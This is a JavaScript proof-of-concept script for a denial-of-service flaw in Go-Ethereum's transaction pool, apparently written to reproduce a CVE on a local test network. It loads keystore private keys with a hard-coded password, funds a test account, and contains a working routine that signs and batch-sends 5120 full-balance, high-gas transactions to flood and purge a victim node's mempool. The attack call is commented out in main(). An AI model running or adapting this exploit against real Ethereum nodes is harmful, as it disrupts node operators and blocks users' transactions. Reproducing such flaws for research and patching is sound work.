/**
 * DENIAL OF SERVICE ATTACK
 *
 * A design flaw in all versions of Go-Ethereum allows an attacker node to send 5120 pending transactions
 * of a high gas price from one account that all fully spend the full balance of the account to a victim Geth node,
 * which can purge all of pending transactions in a victim node's memory pool and then occupy the memory pool to
 * prevent new transactions from entering the pool, resulting in a denial of service (DoS).
 */
const Web3 = require('web3');
const fs = require("fs");
const keythereum = require("keythereum");
const {arrayContainsArray} = require("ethereumjs-util");
const web3 = new Web3('http://localhost:8547');
const batch = new web3.BatchRequest();
const BN = web3.utils.BN;

//Get private key of node 1
const PASSWORD = "helloworld";
const KEYSTORE = `${__dirname}/node1_keystore.json`;
const keyObject = JSON.parse(fs.readFileSync(KEYSTORE, {encoding: "utf8"}));
const privateKey = keythereum.recover(PASSWORD, keyObject).toString("hex");
const MAIN_ADDR = '0x'+keyObject.address;

//Get private key of node 3
const PASSWORD_ = "helloworld";
const KEYSTORE_ = `${__dirname}/node3_keystore.json`;
const keyObject_ = JSON.parse(fs.readFileSync(KEYSTORE_, {encoding: "utf8"}));
const privateKey_ = keythereum.recover(PASSWORD_, keyObject_).toString("hex");
const node3 = '0x'+keyObject_.address;

/**
 * Since web3.eth.sendSignedTransaction has a callback, we can find out how
 * many txs were "successful" (a receipt was produced but ethereum hasn't reached consensus yet)
 * by incrementing the ACCEPTED_TXS counter.
 *
 * @type {number}
 */
let ACCEPTED_TXS = 0;

/* fs.readFile(`${__dirname}/accounts.json`, ((err, data) => {
    if (err) throw err;
    let jsData = data.toString();
    jsData = JSON.parse(jsData);
    const accounts = new Map();
    for (const [key, value] of Object.entries(jsData)) {
        accounts.set(key, value);
    }
    async function initialise() {
        for (const [key, value] of accounts) {
            await firstSendEth(key, '1000000000000');
            await assertBalance(key);
        }
    }
    initialise();

}));
*/


//First send 1 eth to testing account
async function firstSendEth(destin, amount) {
    const nonce = await web3.eth.getTransactionCount(MAIN_ADDR);

    const createTransaction = await web3.eth.accounts.signTransaction(
        {
                from: MAIN_ADDR,
                to: destin,
                value: web3.utils.toWei(amount, 'ether'),
                gas: "21000",
                nonce
            },
            privateKey
        );
        const receipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
        console.log(nonce, "address:", destin, "been credited, tx_hash:", receipt.transactionHash);
}

//sanity check, assert testing account balance is just 1 eth
async function assertBalance(addr) {
    const raw_bal = await web3.eth.getBalance(addr);
    const bal = web3.utils.fromWei(raw_bal,'ether');
    console.log(node3, "BALANCE IS:", bal, "ETH");
}

async function createAttackTxs() {
    const rawTxs = [];
    let nonce = await web3.eth.getTransactionCount(node3);
    const gasToUse = new BN("7999999"); // almost the size of block gas limit
    let gas = new BN(gasToUse);
    gas = gas.mul(new BN('1000000000')); // multiply by gas price to get gas * price value
    let bal = await web3.eth.getBalance(node3);
    bal = new BN(bal);
    bal = bal.sub(gas);

    // since javascript does not support multithreading, we will
    //have to first create all transactions, then send them as a batch
    //of 5120 txs.
    for (let i = 0; i < 5120; i++) {
        if (i !== 0) nonce += 1;

        const createTransaction = await web3.eth.accounts.signTransaction(
            {
                from: node3,
                to: "0xa7138fb2a194e312764fc1243f6b2eef4d87fc93", // random address, the CVE does not specify which address to use
                value: bal, // fully spending the balance
                gas: gasToUse.toString(10), // high gas being used
                nonce
            },
            privateKey_
        );
        rawTxs.push(createTransaction);
        console.log(nonce, "created");
    }
    let i = 0;
    for (const tx of rawTxs) {
        batch.add(web3.eth.sendSignedTransaction.request(tx.rawTransaction, 'latest', (err, hash) => {
            if (hash) {
                ACCEPTED_TXS++;
                console.log(ACCEPTED_TXS, "----SUCCESS--------", hash);
            }
        }));
        console.log(i, "added", tx.rawTransaction);
        i++;
    }
    console.log("executing...");
    batch.execute();
    return true;
}

async function main() {
    await firstSendEth("0x39901435f5EC9e1079AAC62F0611B27e2D314FC7", "30000");
    //await assertBalance();
    //const complete = await createAttackTxs();
    //console.log(complete);
}
main();
